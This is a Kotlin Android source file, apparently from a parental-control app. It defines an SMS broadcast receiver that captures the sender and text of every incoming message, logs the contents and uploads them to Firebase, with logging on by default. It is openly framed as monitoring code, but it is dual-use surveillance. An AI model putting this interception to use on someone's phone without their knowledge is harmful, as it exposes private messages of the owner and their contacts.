package com.example.parentalcontrol

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import com.yourpackage.name.model.SmsData

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val prefs = context.getSharedPreferences("prefs", Context.MODE_PRIVATE)
        val isLoggingEnabled = prefs.getBoolean("log_sms", true)

        if (!isLoggingEnabled) {
            Log.d("SmsReceiver", "Logging disabled.")
            return
        }

        val bundle: Bundle? = intent.extras
        val messages: Array<SmsMessage?>

        if (bundle != null) {
            val pdus = bundle["pdus"] as Array<*>
            messages = arrayOfNulls(pdus.size)

            for (i in pdus.indices) {
                messages[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                val sender = messages[i]?.originatingAddress ?: ""
                val message = messages[i]?.messageBody ?: ""

                val smsData = SmsData(
                    sender = sender,
                    message = message,
                    timestamp = System.currentTimeMillis()
                )

                FirebaseUtils.uploadSms(smsData)
                Log.d("SmsReceiver", "Logged: $sender - $message")
            }
        }
    }

}
